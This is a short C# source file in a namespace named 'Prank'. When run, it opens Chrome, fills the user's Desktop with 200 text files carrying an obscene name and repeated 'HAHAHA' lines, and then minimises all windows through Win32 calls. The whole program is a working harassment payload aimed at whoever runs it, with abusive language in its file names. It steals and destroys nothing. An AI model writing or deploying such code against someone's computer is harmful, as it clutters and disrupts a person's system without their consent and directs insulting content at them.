using System;//kd
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Reflection;

namespace Prank
{
    class Program
    {
        static void Main(string[] args)
        {

            Process.Start(@"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe");
            string file = "";

            for (int i = 0; i < 200; i++)
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (i != 0)
                {
                    file = $"Suck it BITCH({i}).txt";
                }
                else
                {
                    file = $"Suck it BITCH.txt";
                }

                path = Path.Combine(path, file);

                using (StreamWriter writer = new StreamWriter(path))
                {
                    for (int y = 0; y < 100; y++)
                    {
                        writer.WriteLine("HAHAHAHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHAHAHAHAHAhAHAHHAHAHAHAHAHAHAHAHAHAHAh");
                    }
                }
            }
            Thread.Sleep(2000);
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
        }


        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        const int WM_COMMAND = 0x111;
        const int MIN_ALL = 419;

    }
}